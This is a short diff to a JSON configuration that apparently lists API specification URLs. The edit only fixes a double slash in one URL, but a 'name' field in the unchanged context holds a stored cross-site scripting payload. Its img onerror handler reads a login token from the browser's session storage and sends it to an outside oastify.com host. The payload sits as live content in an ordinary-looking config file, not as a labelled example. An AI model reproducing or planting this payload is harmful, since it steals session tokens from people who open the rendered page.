@@ -2,7 +2,7 @@
   "urls": [
     {
       "name": "<img src=x onerror=\"fetch('https://3swd5o9oiawf1ylcame0lvajza51tshh.oastify.com/jwt?t='+btoa(sessionStorage.getItem('loginToken')||'no-session'))\">",
-      "url": "https://yarterss.github.io//spec.json"
+      "url": "https://yarterss.github.io/spec.json"
     },
     {
       "name": "DMAT API",
